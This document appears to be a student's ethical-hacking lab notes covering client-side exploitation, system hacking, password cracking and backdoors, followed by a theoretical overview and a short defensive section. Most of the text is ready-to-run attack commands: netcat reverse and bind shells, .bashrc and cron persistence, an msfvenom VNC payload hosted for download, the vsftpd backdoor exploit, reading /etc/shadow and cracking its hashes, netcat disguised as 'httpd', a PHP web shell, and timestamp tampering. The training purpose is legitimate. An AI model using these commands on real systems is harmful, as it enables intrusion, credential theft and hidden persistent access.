# Lab 6 – Client-Side Exploitation & Backdoors (Commands Only)

msfconsole

# Netcat Reverse Shell
nc -lvnp 4444
nc -e /bin/bash 192.168.56.104 4444
whoami
uname -a

# Persistent Backdoor
echo "nc -e /bin/bash 192.168.56.104 4444" >> ~/.bashrc
sudo reboot
nc -lvnp 4444

# VNC Backdoor (Metasploit)
use exploit/multi/handler
set payload windows/vncinject/reverse_tcp
set LHOST 192.168.56.104
set LPORT 5900
exploit

# VNC Payload
msfvenom -p windows/vncinject/reverse_tcp LHOST=192.168.56.104 LPORT=5900 -f exe -o /var/www/html/vnc_backdoor.exe
service apache2 start
http://192.168.56.104/vnc_backdoor.exe


# Lab 8 – System Hacking & Password Cracking (Commands Only)

# Scanning
nmap -sn 192.168.68.0/24
nmap -sS -sV -O 192.168.68.10
ping 192.168.68.10

# Exploitation
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.68.10
run
sessions -i 1
sessions -u 1

# System Info
uname -a
whoami
cat /etc/shadow

# Hash Extraction
echo 'msfadmin:$1$H6Uks8/P$M0Lkdf2jR1...' > /root/hashes.txt

# John the Ripper
john --list=formats | grep md5
john /root/hashes.txt
john --show /root/hashes.txt

# Hashcat
echo '$6$hr7sD/...$K1DSmET8Q' > hashcat.txt
head -n 10 /usr/share/wordlists/rockyou.txt > rockyou2.txt
hashid hashcat.txt
hashcat -m 500 hashcat.txt rockyou2.txt
hashcat -m 500 hashcat.txt --show

# Post-Exploitation
upload /usr/share/metasploit-framework/data/post/test.txt /tmp/
ls /tmp/
execute -f /bin/bash -a "-c 'echo YOU_HAVE_BEEN_HACKED > /tmp/hacked.txt'"
cat /tmp/hacked.txt


# Lab 9 – Backdooring & Persistent Access (Commands Only)

# Connectivity
ping 192.168.68.10

# Reverse Shell
nc -lvnp 4444
nc 192.168.56.101 4444 -e /bin/bash
id
uname -a

# Bind Shell
nc -lvnp 5555 -e /bin/bash
nc 192.168.56.102 5555

# Persistence (Cron)
sudo crontab -e
@reboot /bin/nc -e /bin/bash 192.168.56.101 6666 &
sudo reboot
nc -lvnp 6666

# Obfuscation
cp /bin/nc /usr/local/bin/httpd
/usr/local/bin/httpd -e /bin/bash 192.168.56.101 8888 &
ps aux | grep httpd
jobs -l

# VNC
vncviewer 192.168.68.10:5900
@reboot /usr/bin/Xtightvnc :0 -geometry 1024x768 -depth 16 -rfbport 5900

# Web Shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/backdoor.php
chown www-data:www-data /var/www/backdoor.php
curl "http://192.168.68.10/backdoor.php?cmd=whoami"

# Anti-Forensics
touch -r /bin/ls /usr/local/bin/httpd
stat /usr/local/bin/httpd

# Detection & Cleanup
ss -tulnp
netstat -tulnp
pstree -p
crontab -l
find /var/www -name "*.php"
kill -9 PID

```
========================
THEORETICAL OVERVIEW
========================

# General Concept
These labs cover critical phases of ethical hacking, including client-side exploitation, system hacking, web-based attacks, and persistence techniques. The focus is on understanding how attackers gain initial access, escalate privileges, maintain long-term access, extract sensitive data, and hide their activity. Studying these techniques helps improve defensive detection, prevention, and incident response.

--------------------------------
Lab 6 – Client-Side Exploitation & Backdoors
--------------------------------
Client-side attacks target applications used directly by end users, such as browsers, executables, and documents, rather than servers. Attackers rely on social engineering to trick victims into executing malicious payloads that establish backdoors.

Key Concepts:
- Reverse Shell: The target initiates a connection back to the attacker, bypassing firewalls and NAT.
- Persistence: Ensuring attacker access survives reboots or logouts.
- Payload Delivery: Using malicious files or links to infect the victim.
- GUI Backdoors: VNC-based access that provides full graphical control.

Tools:
- Metasploit: Exploitation framework and payload handler.
- Netcat: Lightweight tool for creating shells and backdoors.
- msfvenom: Generates malicious payloads.
- Apache2: Hosts payloads for victim download.

--------------------------------
Lab 7 – Web-Based Hacking
--------------------------------
Web-based hacking focuses on exploiting vulnerabilities in web applications and web servers caused by insecure coding, weak authentication, poor session management, and misconfigurations. Since web applications are publicly accessible, they are a primary attack surface.

Key Concepts:
- OWASP Top 10: The most critical web application security risks.
- Automated Scanning: Quickly identifying vulnerabilities using scanners.
- Manual Exploitation: Verifying and exploiting vulnerabilities beyond scanner output.
- Session Management Flaws: Insecure cookies that allow hijacking or impersonation.
- Cookie Manipulation: Altering authentication cookies to bypass login mechanisms.

Common Vulnerabilities:
- Cross-Site Scripting (XSS)
- SQL Injection (SQLi)
- Authentication Bypass
- Security Misconfiguration

Tools:
- OWASP ZAP: Automated vulnerability scanning and proxying.
- Nikto: Web server vulnerability scanner.
- Burp Suite: HTTP/HTTPS interception and manipulation.
- Firefox Developer Tools: Cookie and session inspection.
- WebGoat / DVWA: Intentionally vulnerable web applications.

--------------------------------
Lab 8 – System Hacking & Password Cracking
--------------------------------
System hacking involves exploiting vulnerable services, escalating privileges, extracting credential data, and cracking passwords offline to recover plaintext credentials.

Key Concepts:
- Enumeration → Exploitation → Privilege Escalation → Post-Exploitation
- Password Hashes: Encrypted representations of passwords stored on the system.
- Offline Cracking: Cracking hashes without interacting with the target.
- Weak Passwords: Easily cracked due to short length or common patterns.

Tools:
- Nmap: Network discovery and service scanning.
- Metasploit: Exploitation and session management.
- John the Ripper: CPU-based password cracking.
- Hashcat: High-speed GPU-based cracking.
- hashid: Identifies password hash types.

--------------------------------
Lab 9 – Backdooring & Persistent Access
--------------------------------
This lab demonstrates how attackers maintain long-term access after a system is compromised, even if the original vulnerability is patched.

Key Concepts:
- Bind Shell: The target listens for incoming connections.
- Reverse Shell: The target connects back to the attacker (preferred).
- Persistence Mechanisms: Cron jobs and startup scripts.
- Obfuscation: Hiding malicious binaries by renaming or disguising them.
- Web Shells: PHP-based backdoors accessible via HTTP.
- Anti-Forensics: Hiding timestamps and attacker traces.

Tools:
- Netcat: Bind and reverse shells.
- Cron: Automatic execution after reboot.
- VNC: Graphical remote access.
- PHP: Web-based command execution.
- Linux Admin Tools: ss, netstat, pstree, crontab, find.

--------------------------------
Defensive Perspective (Blue Team)
--------------------------------
From a defensive standpoint, these labs highlight the importance of:
- Monitoring open ports and unexpected listeners.
- Inspecting startup tasks and cron jobs.
- Using file integrity monitoring (FIM).
- Detecting abnormal processes and disguised binaries.
- Securing web applications and enforcing strong passwords.
- Disabling unused services and keeping systems updated.

---

Reverse Shell vs Bind Shell
Reverse shells succeed because they use outbound connections, which are usually allowed through corporate firewalls, unlike inbound bind shells.
Renamed Malicious Binary
Defenders detect it through behavior, hashes, and network activity, not the filename.
Weak VNC Password Risk
Allows unauthorized remote access, often giving full control of the system.
Danger of Persistence
Persistence lets attackers maintain long-term access, even after reboots or partial cleanup
